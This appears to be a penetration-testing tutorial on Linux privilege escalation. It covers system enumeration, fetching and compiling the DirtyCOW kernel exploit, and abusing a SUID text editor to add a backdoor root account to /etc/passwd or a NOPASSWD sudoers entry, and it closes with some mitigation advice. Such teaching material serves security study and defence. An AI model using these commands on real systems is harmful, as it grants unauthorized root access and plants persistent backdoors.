# Privilege Escalation on Linux

It's most pertinent to enumerate the system first in the same way that you might have enumerated the network.
We need to get a frame of reference for what applications and services are running, what ports are open, what users exist, and where applications are configured.

Important information to gather:

* Distribution Type
* Kernel Version
* Running Applications
* Running Services
* Weak file permissions (SUID / GUID)
* Scheduled Jobs 

### OS, Kernel, Hostname

```bash
cat /etc/issue
cat /proc/version
hostname
uname -a
cat /etc/centos-release || cat /etc/redhat-release
```

With this information retrieved, we can check searchsploit, Exploit-db and Google if the kernel has any vulnerabilities. We can also check for the OS version to determine kernel exploits.

When checking for exploits, it's a good idea to check against the full kernel like:

```bash
Linux kernel 3.10.0-123
Linux kernel 3.10.0
Linux kernel 3.10
Linux kernel 3.1
```

### Users

```bash
cat /etc/passwd
id
who
w
sudo -l
```

### Sudoers

The sudoers file allows sudo permissions - this can be all, or some subset of commands allowed to be executed as the root user. 
```bash
# Permits useraccount to execute apt-get and shutdown as root
useraccount ALL=/usr/bin/apt-get,/sbin/shutdown
```

### Networking

```bash
# Network Adapters
ifconfig -a
ethtool
# Routing table
route
# Active connections
netstat -pantu
# Arp table entries
arp -e
```

### Applications and Services 

```bash
ps -aux
ps -elf
ps aux | grep root

dpkg -l || rpm -qa
pip freeze
find /etc/ "*.conf" 
ls -las /var/www/html
### configuration.php and wp-config.php can contain sensitive information
find / -user root -perm 4000 -print 2>/dev/null
```

### Files and Filesystems

```bash
cat /etc/fstab
# Finding world-writable directories
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root

# For root:
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root

# World writable files
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null

find /etc -perm -2 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
getcap -r / 2>/dev/null
```

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
http://netsec.ws/?p=309

### Automation

How much easier would it be to run a script that does much of this for us? Enter `LinPEAS` - Linux Privilege Escalation Awesome Script.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

### Linux Privilege Escalation Checker

A python script that checks for privilege escalation vulnerabilities - will suggest local privilege escalation exploits for the system.

```bash
wget http://www.securitysift.com/download/linuxprivchecker.py
```

### Unix-privesc-check v1.4

Another tool by pentestmonkey - attempts to find misconfigurations that permit escalation.

http://pentestmonkey.net/tools/audit/unix-privesc-check

```bash
./unix-privesc-check standard
./unix-privesc-check detailed
```



## Exploiting the Linux Kernel

Lets use the DirtyCOW exploit.

```bash
wget http://www.exploit-db.com/download/40616 -O cowroot.c
```

Once downloaded, we need to uncomment the correct payload (x86 or x64) as both are included.
Afterwards, we can compile the exploit:

```bash
gcc cowroot.c -o cowroot -pthread
```

Lastly, we can run the exploit:

```bash
./cowroot
```

With permissions successfully escalated, comments suggest to run the following command to prevent the system from becoming unstable and crashing:
```bash
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```

### Remediation and Mitigation

Objectively dissecting this, a successful DirtyCOW exploitation requires **5** mechanisms to succeed:

1. A vulnerable kernel
2. A working exploit
3. A way to transfer the exploit
4. A way to compile the exploit
5. A way to execute the exploit



### Preventing Transfer

We can disable any unnecessary tools and services. As some of these are useful for other purposes, another mechanism might be specifically 'allowlisting' who can usese programs / utilities. Optionally, usage of such tools can be monitored. 

* FTP
* TFTP
* SMB
* SCP
* wget
* Curl

### Removing compilation Tools

Prevent or disallow compilation tools! GCC / CC and others should only be installed for as long as actively needed for usage. It's also important to restrict usage to specific user accounts. 

### Preventing Execution

It is important to limit writable and executable directories for system users and services. Specifically /tmp and /dev/shm should be separately partitioned, and mounted with `noexec`. To restrict applications, you can set permissions to `rwx------` or `700` to ensure only the appropriate user can execute.

## Exploiting SUID

`SUID` means `set user ID` - allows lower permissioned users to execute a file as the file owner. For example, `ping`, or `nmap` require root permissions to open raw network sockets, or `passwd` which allows a user to change the account password.

This is a double edged sword - it allows elevated permissions for single applications, only when needed. It's also possible however to be abused to edit files or execute commands with unintended permissions.

### Nano

To demonstrate the potential for abuse, lets add SUID to the text editor Nano. 

```bash
# Add the SUID flag
chmod u+s /bin/nano
# Find all SUID files
find /* -user root -perm -4000 -print 2>/dev/null
```

With SUID on the editor, we can now edit any file as the root user. How about passwd?

``` bash
nano /etc/passwd

# root:x:0:0:root:/root:/bin/bash
# root: = username
# :x: = Password - `x` indicates stored in /etc/shadow
# :0: = UID
# :0: = GID
# :root: = GECOS field for full name etc.
# :/root = Home Directory
# :/bin/bash = Command line shell on login

```

Armed with this information, we can add a new root user to the system. 
In order to do so however, we do need a crypt hash from a password for the 2nd field.

```perl
perl -e 'print crypt("PASSWORD123", "salt") "\n"'
# returns poD7u2nSiBSLk
# Open passwd with nano again
nano /etc/passwd
# Add a new root user
pom:poD7u2nSiBSLk:0:0:root:/root:/bin/bash
# Switch to the new root user
su pom
# Verify identity
id
```

An alternative to adding a new user, could simply be to update the `/etc/sudoers` file:

```bash
# User privilege specification 
root     ALL=(ALL:ALL) ALL
sam      ALL=(ALL:ALL) NOPASSWD:ALL

# After saving, verify sudo
sudo id

```

